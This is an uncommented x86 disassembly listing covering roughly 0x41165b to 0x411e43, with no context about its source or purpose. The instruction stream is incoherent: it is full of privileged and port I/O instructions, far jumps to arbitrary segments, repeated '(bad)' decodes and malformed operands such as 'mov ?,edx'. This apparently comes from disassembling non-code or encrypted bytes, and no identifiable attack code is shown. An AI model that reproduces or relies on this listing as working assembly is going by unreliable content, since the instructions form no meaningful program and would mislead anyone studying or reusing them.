  41165b:	inc    ebp
  41165c:	int    0x3f
  41165e:	enter  0xf17e,0x55
  411662:	mov    BYTE PTR [esi+0x4f2fd27e],cl
  411668:	out    dx,al
  411669:	and    al,0xa5
  41166b:	dec    edi
  41166c:	ficomp DWORD PTR [edx+0x12]
  41166f:	jmp    0xb4fc:0xa3a0a344
  411676:	popa   
  411677:	jne    0x4116f5
  411679:	nop
  41167a:	add    eax,0x4448869f
  41167f:	ins    BYTE PTR es:[edi],dx
  411680:	pushf  
  411681:	clc    
  411682:	stos   BYTE PTR es:[edi],al
  411683:	into   
  411684:	lods   eax,DWORD PTR ds:[esi]
  411685:	xchg   edi,eax
  411686:	stc    
  411687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411688:	and    cl,BYTE PTR [esp+eax*4+0x31]
  41168c:	or     ah,dh
  41168e:	mov    ecx,0xf0d1be66
  411693:	addr16 push esp
  411695:	jbe    0x4116e3
  411697:	hlt    
  411698:	jp     0x411686
  41169a:	jmp    0x8993:0xae25142b
  4116a1:	cmp    al,0xfc
  4116a3:	push   edx
  4116a5:	jmp    0x4116fb
  4116a7:	or     eax,0x8f2cd893
  4116ac:	rcl    ebx,cl
  4116ae:	ins    DWORD PTR es:[edi],dx
  4116af:	inc    edx
  4116b0:	mov    esp,edi
  4116b2:	or     esi,DWORD PTR [esi+eax*1]
  4116b5:	repz repnz or al,0x18
  4116b9:	std    
  4116ba:	sub    dl,BYTE PTR [ecx-0x3]
  4116bd:	jnp    0x4116f8
  4116bf:	js     0x41164f
  4116c1:	inc    edi
  4116c2:	push   edx
  4116c3:	icebp  
  4116c4:	addr16 xchg edx,eax
  4116c6:	jmp    0x5b0f73f7
  4116cb:	mov    ch,0x16
  4116cd:	sbb    eax,ebx
  4116cf:	xor    DWORD PTR [ebx],esi
  4116d1:	and    esi,ecx
  4116d3:	sar    DWORD PTR ds:0x11267613,0x37
  4116da:	dec    ebp
  4116db:	pop    ds
  4116dc:	inc    esp
  4116dd:	fwait
  4116de:	int    0x82
  4116e0:	jo     0x41173d
  4116e2:	cmp    DWORD PTR [edx],edi
  4116e4:	popf   
  4116e5:	inc    ebp
  4116e6:	and    DWORD PTR [ebx+0x5b7bc6c0],esp
  4116ec:	ds (bad) 
  4116ee:	cmc    
  4116ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116f0:	mov    edx,0xe829fb6c
  4116f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116f6:	mov    ebp,0x66c33402
  4116fb:	or     bh,bl
  4116fd:	cwde   
  4116fe:	cmp    dl,BYTE PTR [eax-0x5c7c0ac7]
  411704:	dec    ebx
  411705:	sbb    bl,BYTE PTR [edx-0x365e4b2e]
  41170b:	xchg   ebp,eax
  41170c:	jle    0x41173d
  41170e:	jbe    0x41176c
  411710:	adc    bl,dh
  411712:	mov    dl,0x73
  411714:	push   ds
  411715:	or     eax,0xc783a886
  41171a:	and    ch,ah
  41171c:	mov    ?,edx
  41171e:	les    eax,FWORD PTR [esi-0x51]
  411721:	loope  0x41174a
  411723:	ss xchg edi,eax
  411725:	into   
  411726:	aas    
  411727:	pop    esi
  411728:	imul   edi,DWORD PTR [ebp-0x70441004],0x30f27ac3
  411732:	adc    ecx,DWORD PTR [ebx]
  411734:	jne    0x4116de
  411736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411737:	xchg   edx,eax
  411738:	mov    cs,edx
  41173a:	jge    0x4117b4
  41173c:	nop
  41173d:	inc    ebp
  41173e:	xor    cl,bl
  411740:	adc    BYTE PTR [ecx+0x52b95f04],bl
  411746:	pop    edx
  411747:	inc    ebx
  411748:	mov    ah,0xcc
  41174a:	and    esi,DWORD PTR [edi]
  41174c:	stos   DWORD PTR es:[edi],eax
  41174d:	js     0x41175d
  41174f:	mov    eax,0xaee45fa7
  411754:	push   esi
  411755:	mov    al,0xbe
  411757:	pop    eax
  411758:	add    cl,BYTE PTR [ecx+0x49]
  41175b:	xchg   ebp,eax
  41175c:	sti    
  41175d:	xchg   esi,eax
  41175e:	(bad)  
  41175f:	data16 xor BYTE PTR [ebx+0x12],bh
  411763:	sub    ebx,DWORD PTR [eax]
  411765:	xor    al,0x75
  411767:	mov    ds:0xf95c124e,al
  41176c:	sbb    esi,ecx
  41176e:	call   0x37e1716f
  411773:	out    dx,eax
  411774:	popw   ss
  411776:	xchg   esp,eax
  411777:	popa   
  411778:	xchg   DWORD PTR [ecx+0xd],esi
  41177b:	lea    ecx,[edi-0x5b]
  41177e:	in     al,dx
  41177f:	std    
  411780:	stos   BYTE PTR es:[edi],al
  411781:	(bad)  
  411782:	xchg   ecx,eax
  411783:	mov    ebp,0x45e3382c
  411788:	(bad)  
  411789:	sbb    cl,al
  41178b:	das    
  41178c:	mov    bl,0xf3
  41178e:	(bad)  
  41178f:	xlat   BYTE PTR ds:[bx]
  411791:	push   0xd9d7cba3
  411796:	and    ecx,ecx
  411798:	das    
  411799:	in     al,dx
  41179a:	add    cl,BYTE PTR [esp+ebp*2+0x2f]
  41179e:	and    edi,esi
  4117a0:	outs   dx,BYTE PTR ds:[esi]
  4117a1:	outs   dx,BYTE PTR ds:[esi]
  4117a2:	imul   al
  4117a4:	out    0x40,al
  4117a6:	sub    cl,dl
  4117a8:	iret   
  4117a9:	xchg   esi,eax
  4117aa:	icebp  
  4117ab:	pop    esi
  4117ac:	sub    DWORD PTR ds:0x259b273f,ecx
  4117b2:	jns    0x41178b
  4117b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117b5:	in     eax,0x10
  4117b7:	retf   
  4117b8:	sub    al,0x1e
  4117ba:	xlat   BYTE PTR ds:[ebx]
  4117bb:	clc    
  4117bc:	jge    0x41177b
  4117be:	add    DWORD PTR [edx-0x264964d1],eax
  4117c4:	int    0xaa
  4117c6:	iret   
  4117c7:	mov    esp,0x5d9895b
  4117cc:	test   DWORD PTR [esi-0xf7294c4],esp
  4117d2:	das    
  4117d3:	cs aad 0x8a
  4117d6:	rcl    ch,1
  4117d8:	sahf   
  4117d9:	dec    ebp
  4117da:	and    DWORD PTR [ebx-0xba30d0],ebp
  4117e0:	push   cs
  4117e1:	and    BYTE PTR [esi+0x41],ah
  4117e4:	pop    eax
  4117e5:	adc    edx,DWORD PTR [edx+ecx*8]
  4117e8:	fild   DWORD PTR [edx]
  4117ea:	or     eax,esi
  4117ec:	mov    edx,0x5f1269c3
  4117f1:	sbb    eax,0x719c1ea5
  4117f6:	into   
  4117f7:	mov    esp,ecx
  4117f9:	test   BYTE PTR [ecx-0x8],0x6f
  4117fd:	les    edx,FWORD PTR [edi-0x7a]
  411800:	jge    0x4117ab
  411802:	push   0x17
  411804:	push   ss
  411805:	dec    ebx
  411806:	cmp    DWORD PTR [ebp+0x47cf13cf],edx
  41180c:	mov    DWORD PTR [edx-0x10c7dd5c],ecx
  411812:	and    BYTE PTR [esi],cl
  411814:	(bad)  
  411816:	sahf   
  411817:	push   esp
  411818:	and    dh,BYTE PTR [ebx+eiz*1+0x3a]
  41181c:	lahf   
  41181d:	sbb    ebx,DWORD PTR [edi+0x77b2730]
  411823:	test   DWORD PTR [ebx-0x5f],ebx
  411826:	inc    ebx
  411827:	push   esp
  411828:	(bad)  
  411829:	sti    
  41182a:	jmp    0x79478749
  41182f:	dec    ebx
  411830:	adc    DWORD PTR [esi+0x68],ebx
  411833:	or     DWORD PTR [edi-0x3b550f6a],eax
  411839:	xor    eax,DWORD PTR [esp+eax*2+0x4dac93a9]
  411840:	outs   dx,BYTE PTR ds:[esi]
  411841:	mov    eax,0x363becb0
  411846:	sbb    al,0x3d
  411848:	mov    WORD PTR [eax],es
  41184a:	cmp    BYTE PTR [ebp-0x104917f3],dh
  411850:	push   cs
  411851:	cmp    al,0xef
  411853:	xchg   bh,al
  411855:	sbb    ch,BYTE PTR [edx]
  411857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411858:	sbb    eax,0x47f6a582
  41185d:	test   eax,0x680b8e4b
  411862:	mov    eax,0x14a12ed1
  411867:	daa    
  411868:	cld    
  411869:	in     eax,dx
  41186a:	sub    ah,BYTE PTR [edi+esi*1]
  41186d:	jae    0x41185f
  41186f:	xor    edi,DWORD PTR [edx-0x5b]
  411872:	shl    DWORD PTR [ecx+0x2c3469ab],1
  411878:	dec    edx
  411879:	test   bl,cl
  41187b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41187c:	(bad)  
  41187e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41187f:	ret    0x37fd
  411882:	jnp    0x411818
  411884:	aaa    
  411885:	arpl   WORD PTR [ebx-0x79274524],dx
  41188b:	aaa    
  41188c:	dec    eax
  41188d:	pop    esp
  41188e:	js     0x41182e
  411890:	call   0x5f82:0x5eeb3342
  411897:	dec    ebx
  411898:	inc    eax
  411899:	mov    ds:0x53f79c04,al
  41189e:	out    0xca,eax
  4118a0:	dec    eax
  4118a1:	xor    DWORD PTR [ebx-0x42],esi
  4118a4:	mov    edx,0xa8f3cbfe
  4118a9:	push   eax
  4118aa:	sub    ecx,DWORD PTR [ebp-0x2191971d]
  4118b0:	int    0x65
  4118b2:	sub    ah,BYTE PTR [ebp+ebp*4-0x50bf4f02]
  4118b9:	jb     0x4118e9
  4118bb:	imul   edx,DWORD PTR [eax+ebp*4+0x3b],0xffffff88
  4118c0:	call   0x286d79e2
  4118c5:	mov    al,ds:0xeb4ec533
  4118ca:	dec    edi
  4118cb:	jne    0x411854
  4118cd:	scas   al,BYTE PTR es:[edi]
  4118ce:	ficomp DWORD PTR [esi-0x6d]
  4118d1:	jge    0x411902
  4118d3:	xor    edi,DWORD PTR [ebx+eax*2-0x7aac3486]
  4118da:	in     eax,dx
  4118db:	popf   
  4118dc:	lds    ebp,FWORD PTR cs:[eax+ebx*4]
  4118e0:	popa   
  4118e1:	fld    QWORD PTR [ebx-0x12a5f594]
  4118e7:	cmp    edi,DWORD PTR es:[edi+ebp*2]
  4118eb:	hlt    
  4118ec:	imul   eax,ebp,0x805c71c1
  4118f2:	push   ss
  4118f3:	push   ebx
  4118f4:	fstp   DWORD PTR [esi+ecx*8-0x64]
  4118f8:	adc    BYTE PTR [edi-0x1bac9348],bl
  4118fe:	push   ebp
  4118ff:	out    0x3a,al
  411901:	xor    al,0x61
  411903:	iret   
  411904:	and    edx,DWORD PTR [ecx+edx*2]
  411907:	jmp    0x7a045d40
  41190c:	jmp    0x411930
  41190e:	outs   dx,DWORD PTR ds:[esi]
  41190f:	je     0x4118af
  411911:	daa    
  411912:	ret    
  411913:	out    0x98,eax
  411915:	dec    esp
  411916:	popa   
  411917:	dec    esp
  411918:	in     al,dx
  411919:	or     bh,BYTE PTR [eax+0x4da4b0f1]
  41191f:	jns    0x411938
  411921:	push   ds
  411922:	cdq    
  411923:	jecxz  0x4118d3
  411925:	sbb    DWORD PTR [ecx+ebp*4],0x77fe8649
  41192c:	test   DWORD PTR [esi+eiz*1],edi
  41192f:	sub    DWORD PTR [ecx-0x6e75827b],ebp
  411935:	sahf   
  411936:	dec    BYTE PTR [esi+eiz*8]
  411939:	popf   
  41193a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41193b:	ret    
  41193c:	cmp    DWORD PTR [ebp+0x3be47499],ebx
  411942:	mov    al,0xdf
  411944:	loopne 0x4118f3
  411946:	push   cs
  411947:	push   ss
  411948:	jge    0x41193e
  41194a:	or     cl,BYTE PTR [edx+0x3237a379]
  411950:	push   edx
  411951:	pop    edi
  411952:	fisubr DWORD PTR [edi+ecx*8+0x5d561fc]
  411959:	mov    BYTE PTR [eax+0x446c2b85],ch
  41195f:	jbe    0x41198a
  411961:	jno    0x41190c
  411963:	xchg   dx,ax
  411965:	fidiv  WORD PTR ds:0x90ef586
  41196b:	sub    eax,0x53b15cd3
  411970:	mov    dh,0xcf
  411972:	stc    
  411973:	icebp  
  411974:	cmp    edi,edx
  411976:	xor    esi,edx
  411978:	sbb    DWORD PTR [ecx-0x13dfa07c],ecx
  41197e:	add    ebx,DWORD PTR [ebx+0x22880b47]
  411984:	push   es
  411985:	jl     0x41195e
  411987:	mov    es,WORD PTR [esi+0x35]
  41198a:	mov    edi,0x78854618
  41198f:	cmc    
  411990:	lock out dx,eax
  411992:	scas   eax,DWORD PTR es:[edi]
  411993:	add    eax,0xaddf089b
  411998:	jno    0x411951
  41199a:	pop    esp
  41199b:	and    ah,BYTE PTR [esi-0x6a96ee0d]
  4119a1:	push   ss
  4119a2:	sub    edx,DWORD PTR [ebx]
  4119a4:	or     ah,BYTE PTR [esi]
  4119a6:	mov    cl,BYTE PTR [ebp-0x5e15316f]
  4119ac:	push   ds
  4119ad:	das    
  4119ae:	retf   0x1b93
  4119b1:	mov    dh,0xb6
  4119b3:	stos   BYTE PTR es:[edi],al
  4119b4:	jp     0x4119bf
  4119b6:	out    0xfb,al
  4119b8:	jo     0x411975
  4119ba:	sub    eax,0x10a0f75d
  4119bf:	jnp    0x4119aa
  4119c1:	mov    ch,0x5f
  4119c3:	aam    0x8e
  4119c5:	cmp    bl,BYTE PTR [ecx-0x2cc9983d]
  4119cb:	das    
  4119cc:	adc    DWORD PTR [ecx],ebx
  4119ce:	ins    DWORD PTR es:[edi],dx
  4119cf:	cmp    dl,BYTE PTR [ebx+0x1]
  4119d2:	bound  edx,QWORD PTR [edi+0x5eacda07]
  4119d8:	adc    bl,BYTE PTR [edx]
  4119da:	call   0xe802:0xc44ae243
  4119e1:	push   ds
  4119e2:	add    al,0x87
  4119e4:	clc    
  4119e5:	shr    DWORD PTR [esi+0x1f],0x47
  4119e9:	mov    al,0xcd
  4119eb:	push   ds
  4119ec:	iret   
  4119ed:	aaa    
  4119ee:	ss pop si
  4119f1:	cmp    DWORD PTR [eax-0x3fafe05e],edx
  4119f7:	ds dec edi
  4119f9:	(bad)
  4119fc:	xor    al,0x85
  4119fe:	(bad)  
  4119ff:	sub    ecx,edx
  411a01:	jbe    0x411a24
  411a03:	out    0xc3,al
  411a05:	fdiv   DWORD PTR [ebp+0x2a4b243e]
  411a0b:	inc    ecx
  411a0c:	test   al,0xa5
  411a0e:	sbb    cl,ch
  411a10:	add    bh,BYTE PTR [eax]
  411a12:	in     al,dx
  411a13:	mov    edi,0xc4031ce5
  411a18:	push   ds
  411a19:	in     eax,dx
  411a1a:	cld    
  411a1b:	mov    ebx,0xd0cbc76f
  411a20:	dec    eax
  411a21:	push   0xccf508bb
  411a26:	arpl   WORD PTR [eax+0x272553d7],di
  411a2c:	push   edi
  411a2d:	shl    bh,cl
  411a2f:	sub    al,0xf
  411a31:	dec    eax
  411a32:	das    
  411a33:	daa    
  411a34:	arpl   WORD PTR [eax-0x50a7a08c],sp
  411a3a:	inc    esp
  411a3b:	cmp    edx,ecx
  411a3d:	js     0x411a7d
  411a3f:	mov    al,ds:0xc764cd2c
  411a44:	cmp    eax,DWORD PTR [ebx-0x36]
  411a47:	pop    ebx
  411a48:	or     dl,ch
  411a4a:	jmp    0x411a97
  411a4c:	cmp    cl,BYTE PTR [eax+0x702d95c9]
  411a52:	jae    0x411ac4
  411a54:	wrmsr  
  411a56:	xor    al,al
  411a58:	xor    al,0x4a
  411a5a:	bts    DWORD PTR [ebp+ecx*1+0x4a431bfb],ebp
  411a62:	out    dx,al
  411a63:	xor    esi,ecx
  411a65:	jns    0x411a55
  411a67:	int3   
  411a68:	sub    al,0x28
  411a6a:	cmp    BYTE PTR ds:0x1c36a338,cl
  411a70:	jge    0x411ae5
  411a72:	lea    esi,ds:[esp+0x1da03dba]
  411a7a:	pusha  
  411a7b:	in     eax,dx
  411a7c:	add    esi,DWORD PTR [eax]
  411a7e:	aam    0x20
  411a80:	mov    ds:0x566506d9,al
  411a85:	pop    esi
  411a86:	mov    bl,0x8f
  411a88:	add    BYTE PTR [edx+ebx*8],dl
  411a8b:	das    
  411a8c:	into   
  411a8d:	add    eax,0x876cf249
  411a92:	out    0x7e,al
  411a94:	les    ebp,FWORD PTR [esi]
  411a96:	mov    ds:0xfcfab33a,al
  411a9b:	es inc esi
  411a9d:	das    
  411a9e:	retf   0x797d
  411aa1:	loope  0x411b12
  411aa3:	popf   
  411aa4:	or     dl,BYTE PTR [edi+edx*4+0x6a]
  411aa8:	cmp    al,0x7f
  411aaa:	push   ebp
  411aab:	adc    eax,0xc5779ad9
  411ab0:	out    0x2e,al
  411ab2:	dec    ebx
  411ab3:	out    dx,al
  411ab4:	loope  0x411a6b
  411ab6:	lods   eax,DWORD PTR ds:[esi]
  411ab7:	loop   0x411a41
  411ab9:	push   ebp
  411aba:	xor    edx,DWORD PTR [ecx+0x71c0f45d]
  411ac0:	jmp    0xdcda:0x8f2d4e66
  411ac7:	pop    ss
  411ac8:	mov    eax,0x57821b79
  411acd:	cli    
  411ace:	mov    ebx,?
  411ad0:	xchg   edx,eax
  411ad1:	cli    
  411ad2:	div    BYTE PTR [ebx-0x7d]
  411ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ad6:	mov    DWORD PTR [eax+ecx*1+0x7b27d300],0x113255f
  411ae1:	js     0x411b1c
  411ae3:	jb     0x411b45
  411ae5:	or     al,BYTE PTR [eax]
  411ae7:	mov    eax,0x1c2a5ddc
  411aec:	jmp    0xb6a7bae7
  411af1:	addr16 jno 0x411b33
  411af4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411af5:	push   0xffffffea
  411af7:	mov    al,BYTE PTR ds:0xe1c63407
  411afd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411afe:	jo     0x411b0c
  411b00:	mov    ecx,DWORD PTR [esi+0x21]
  411b03:	test   BYTE PTR [esi+0x41],al
  411b06:	jg     0x411aff
  411b08:	inc    ecx
  411b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b0a:	out    dx,eax
  411b0b:	rol    DWORD PTR [eax-0x2179d3a2],1
  411b11:	push   0x9
  411b13:	inc    edx
  411b14:	in     al,0x4e
  411b16:	and    ebx,edx
  411b18:	push   0x47
  411b1a:	jne    0x411b00
  411b1c:	and    al,ch
  411b1e:	cmp    ebp,edx
  411b20:	shl    ebp,1
  411b22:	push   es
  411b23:	sub    DWORD PTR [ecx],esp
  411b25:	mov    bh,0x80
  411b27:	jmp    0x411b3e
  411b29:	add    eax,DWORD PTR [edi-0x5fe44c5b]
  411b2f:	jmp    0x411b77
  411b31:	and    al,0x57
  411b33:	ss cld 
  411b35:	mov    ah,0x7a
  411b37:	not    BYTE PTR [eax]
  411b39:	jno    0x411b24
  411b3b:	cmp    al,0x92
  411b3d:	and    eax,0x14089089
  411b42:	dec    edx
  411b43:	cmp    al,0xcf
  411b45:	dec    edx
  411b46:	mov    al,ds:0x2d307825
  411b4b:	push   cs
  411b4c:	xchg   ebx,eax
  411b4d:	gs sub al,0x43
  411b50:	ja     0x411b8a
  411b52:	inc    ebp
  411b53:	daa    
  411b54:	mov    ebx,0x4952e713
  411b59:	lods   al,BYTE PTR ss:[esi]
  411b5b:	je     0x411ae7
  411b5d:	sub    BYTE PTR [edx-0x77],ch
  411b60:	test   eax,0xac835d25
  411b65:	sti    
  411b66:	mov    ds:0xf5ea6ef0,al
  411b6b:	leave  
  411b6c:	add    cl,cl
  411b6e:	fild   QWORD PTR [ebp-0x12]
  411b71:	adc    BYTE PTR [ecx-0x697b7785],dh
  411b77:	lahf   
  411b78:	inc    ebx
  411b79:	cvtps2pd xmm1,QWORD PTR [edx-0x45]
  411b7d:	push   es
  411b7e:	sbb    BYTE PTR [esp+eiz*4+0x6dbe5ecc],ch
  411b85:	push   es
  411b86:	xor    al,0xf1
  411b88:	xchg   esi,eax
  411b89:	jmp    0xc310:0xbb434422
  411b90:	jbe    0x411bef
  411b92:	repnz pop edi
  411b94:	test   al,0x82
  411b96:	in     eax,0x1b
  411b98:	add    eax,0x553b823e
  411b9d:	out    0x23,eax
  411b9f:	in     eax,0x36
  411ba1:	pop    ebx
  411ba2:	(bad)  
  411ba3:	sbb    al,0xc9
  411ba5:	ins    DWORD PTR es:[edi],dx
  411ba6:	(bad)  
  411ba7:	sub    DWORD PTR [edx],esi
  411ba9:	repz fadd st,st(7)
  411bac:	sbb    ebx,DWORD PTR [ecx]
  411bae:	jmp    0x96af:0x3bdb8a72
  411bb5:	xlat   BYTE PTR ds:[ebx]
  411bb6:	add    cl,BYTE PTR [ebp+0x36e5526c]
  411bbc:	fisubr WORD PTR es:[eax-0x14]
  411bc0:	xor    eax,0x9c17ba64
  411bc5:	rol    DWORD PTR [edx-0x2d8ad04c],0x16
  411bcc:	lahf   
  411bcd:	imul   edx,DWORD PTR [edi-0x5ffab09f],0x4c
  411bd4:	pop    ebp
  411bd5:	push   ds
  411bd6:	loop   0x411c26
  411bd8:	sub    al,0x3d
  411bda:	add    ah,BYTE PTR [ecx+0x4f]
  411bdd:	add    DWORD PTR [esi-0x3071b310],edi
  411be3:	adc    ebx,DWORD PTR [eax-0x1ef36e90]
  411be9:	iret   
  411bea:	enter  0x94be,0x3b
  411bee:	clc    
  411bef:	inc    ebx
  411bf0:	mov    WORD PTR fs:[esi],cs
  411bf3:	dec    ebp
  411bf4:	mov    dl,0xc4
  411bf6:	cdq    
  411bf7:	out    0x92,eax
  411bf9:	lods   al,BYTE PTR ds:[esi]
  411bfa:	mov    dl,0x72
  411bfc:	imul   ecx,ebp,0x1da4c58d
  411c02:	ins    BYTE PTR es:[edi],dx
  411c03:	push   esi
  411c04:	icebp  
  411c05:	pop    ds
  411c06:	and    ch,BYTE PTR [edi-0x48]
  411c09:	mov    esi,0x2522d77e
  411c0e:	push   ebx
  411c0f:	cmp    eax,DWORD PTR fs:[ebp-0x43]
  411c13:	fs xor al,0xf1
  411c16:	mov    ch,0xb5
  411c18:	sbb    ch,BYTE PTR [esp+edi*2-0x5b29b306]
  411c1f:	shr    DWORD PTR [ecx+0x11530851],1
  411c25:	ror    DWORD PTR [edx*8+0x23ca4b2],cl
  411c2c:	push   ss
  411c2d:	imul   esi,DWORD PTR [edi-0x4],0x7532c364
  411c34:	xchg   BYTE PTR [ebx+eiz*2-0x6c],bl
  411c38:	add    bl,dl
  411c3a:	jbe    0x411c6c
  411c3c:	in     eax,dx
  411c3d:	jno    0x411c0c
  411c3f:	mov    ds:0xc7ac5791,eax
  411c44:	loopne 0x411c54
  411c46:	or     BYTE PTR [eax+esi*2-0xdd4a319],ch
  411c4d:	xchg   esp,eax
  411c4e:	sbb    ebx,ebp
  411c50:	dec    esi
  411c51:	lock inc edx
  411c53:	inc    esp
  411c54:	mov    edx,0x1b3921bf
  411c59:	in     al,0x44
  411c5b:	mov    ecx,0xbc2c4a68
  411c60:	push   edi
  411c61:	sbb    ebx,DWORD PTR [ecx+0x5c]
  411c64:	imul   eax,DWORD PTR [eax+0x30c91c13],0x3320dda2
  411c6e:	sbb    eax,0xf91fad9f
  411c73:	xchg   ebx,eax
  411c74:	xlat   BYTE PTR es:[ebx]
  411c76:	push   esp
  411c77:	add    eax,0x62c307f7
  411c7c:	xor    al,0x18
  411c7e:	out    0x9a,eax
  411c80:	ss add eax,0xe80278bb
  411c86:	xor    eax,0x5b7b326d
  411c8b:	lods   al,BYTE PTR ds:[esi]
  411c8c:	xor    eax,0x42a3e2c5
  411c91:	xchg   bl,cl
  411c93:	(bad)  
  411c94:	out    dx,eax
  411c95:	dec    edi
  411c96:	xchg   edx,eax
  411c97:	dec    esp
  411c98:	js     0x411cec
  411c9a:	enter  0xba26,0x85
  411c9e:	fwait
  411c9f:	retf   0xf3b
  411ca2:	lock je 0x411c7b
  411ca5:	dec    ecx
  411ca6:	and    DWORD PTR [ebx],edx
  411ca8:	pushf  
  411ca9:	and    ebp,DWORD PTR [ebp+0x5e524b40]
  411caf:	dec    BYTE PTR ds:[ecx]
  411cb2:	loopne 0x411ca9
  411cb4:	mov    ecx,0x9348cfff
  411cb9:	mov    ah,0x9d
  411cbb:	mov    edi,0x5a72e51
  411cc0:	mov    dl,BYTE PTR [eax+0x4c]
  411cc3:	mov    edx,0xdf791165
  411cc8:	scas   eax,DWORD PTR es:[edi]
  411cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cca:	jg     0x411ca7
  411ccc:	mov    ebp,0xec1a0976
  411cd1:	mov    ds:0x82730345,eax
  411cd6:	stos   BYTE PTR es:[edi],al
  411cd7:	ins    DWORD PTR es:[edi],dx
  411cd8:	sbb    ebx,DWORD PTR [ebp-0x2]
  411cdb:	xchg   ebp,eax
  411cdc:	xchg   ebp,eax
  411cdd:	jg     0x411d1f
  411cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ce0:	nop
  411ce1:	out    0x35,al
  411ce3:	sbb    BYTE PTR [eax-0x36],ah
  411ce6:	call   0xefc9b4f9
  411ceb:	sbb    eax,0x3dd5281c
  411cf0:	mov    ebx,0x528d2397
  411cf5:	and    BYTE PTR [edi],dh
  411cf7:	inc    esp
  411cf8:	je     0x411cf5
  411cfa:	mov    DWORD PTR [edi+ebp*4+0xd],ecx
  411cfe:	outs   dx,DWORD PTR ds:[esi]
  411cff:	and    DWORD PTR [edi+0x20],edx
  411d02:	ja     0x411d35
  411d04:	cwde   
  411d05:	stc    
  411d06:	repnz fs or al,0xa3
  411d0a:	mov    ebp,0x9f3be270
  411d0f:	jb     0x411d06
  411d11:	or     BYTE PTR [ecx-0xc664e20],bh
  411d17:	jbe    0x411d77
  411d19:	loopne 0x411d20
  411d1b:	sbb    eax,0xae9d0daa
  411d20:	mov    dh,0x7f
  411d22:	mov    edx,0xa1f57b9b
  411d27:	pop    edi
  411d28:	push   esi
  411d29:	xor    edx,DWORD PTR [edx+0x2f]
  411d2c:	cmp    ah,BYTE PTR [esp+ebx*2+0x47]
  411d30:	mov    edx,0xbd017a0f
  411d35:	(bad)  [ecx-0x55]
  411d38:	aad    0x5
  411d3a:	inc    ebp
  411d3b:	dec    BYTE PTR [ebx+0x5f4bf1d7]
  411d41:	int3   
  411d42:	shl    DWORD PTR [edx],1
  411d44:	and    BYTE PTR [edi+0x5a3d7ea5],0x78
  411d4b:	ss mov esp,0x4fec6ddb
  411d51:	cld    
  411d52:	sbb    al,0x14
  411d54:	cmc    
  411d55:	mov    cl,0xc5
  411d57:	js     0x411d21
  411d59:	push   ecx
  411d5a:	adc    BYTE PTR [edi-0x3e838192],dl
  411d60:	inc    ebx
  411d61:	adc    DWORD PTR [esi+0xf],esp
  411d64:	dec    edi
  411d65:	mov    BYTE PTR [ebp-0x60a9530a],0xc5
  411d6c:	fisttp QWORD PTR ss:[ebp-0x7fd66743]
  411d73:	sbb    al,0x3b
  411d75:	mov    ecx,0x4b84512b
  411d7a:	mov    ch,BYTE PTR gs:[ecx-0x22]
  411d7e:	out    dx,eax
  411d7f:	sbb    ebp,ecx
  411d81:	(bad)  
  411d82:	jle    0x411dfc
  411d84:	push   edi
  411d85:	les    edi,FWORD PTR [ecx-0x4d8ff84c]
  411d8b:	das    
  411d8c:	icebp  
  411d8d:	dec    DWORD PTR [esi+0x68]
  411d90:	cmp    eax,0x46b9824a
  411d95:	xchg   DWORD PTR ds:[ebx-0x12],esp
  411d99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d9a:	out    dx,eax
  411d9b:	inc    eax
  411d9c:	mov    eax,ds:0xdd42a423
  411da1:	leave  
  411da2:	mov    DWORD PTR [ebp+eiz*8-0x4a084230],eax
  411da9:	mov    ds:0x8ec6829c,al
  411dae:	pop    ebp
  411daf:	fistp  WORD PTR [ecx]
  411db1:	add    al,BYTE PTR [edx+0x32fc7b1c]
  411db7:	cs mov bl,0xcd
  411dba:	jmp    0x411de4
  411dbc:	loop   0x411e33
  411dbe:	adc    bh,BYTE PTR [ecx+esi*2-0x21cd7a08]
  411dc5:	cli    
  411dc6:	ss push ss
  411dc8:	mov    cl,0xf7
  411dca:	jmp    0xeb8f:0x2c0cf8f4
  411dd1:	dec    esi
  411dd2:	and    bh,BYTE PTR [edi+edi*4+0x75]
  411dd6:	mov    ah,0x2
  411dd8:	push   cs
  411dd9:	sub    DWORD PTR [esi+0x0],edx
  411ddc:	loopne 0x411e01
  411dde:	js     0x411e0d
  411de0:	xchg   DWORD PTR [esi+edx*4-0x7],esi
  411de4:	les    ebp,FWORD PTR [edi+0x6e30b500]
  411dea:	(bad)  
  411deb:	sbb    dh,BYTE PTR [ebp+0x0]
  411dee:	stc    
  411def:	xchg   ebp,eax
  411df0:	mov    esp,0xa1391cdd
  411df5:	ja     0x411e15
  411df7:	out    0xcd,eax
  411df9:	(bad)  
  411dfa:	popf   
  411dfb:	data16 mov dl,0xdf
  411dfe:	cmp    DWORD PTR [ecx-0x79],ebx
  411e01:	push   cs
  411e02:	adc    eax,DWORD PTR [ebx-0x3f]
  411e05:	aas    
  411e06:	and    DWORD PTR [ebx+0x76c8154],ebp
  411e0c:	nop
  411e0d:	out    0x4e,al
  411e0f:	or     BYTE PTR [ecx+0x3b8b26a0],ch
  411e15:	add    ebp,DWORD PTR ss:[edx]
  411e18:	jmp    0x1c636b1f
  411e1d:	cmc    
  411e1e:	(bad)  
  411e1f:	into   
  411e20:	sub    bl,ch
  411e22:	in     eax,dx
  411e23:	add    DWORD PTR [ebx+0x484571cb],ecx
  411e29:	test   eax,0x828ba30e
  411e2e:	jp     0x411e4f
  411e30:	in     al,dx
  411e31:	sti    
  411e32:	jge    0x411ea9
  411e34:	cmp    eax,DWORD PTR [esp+edi*8-0x3d]
  411e38:	sub    eax,0xa3314984
  411e3d:	add    DWORD PTR [esi],ecx
  411e3f:	sbb    al,0xb
  411e41:	(bad)  
  411e43:	lock enter 0x96d2,0x84
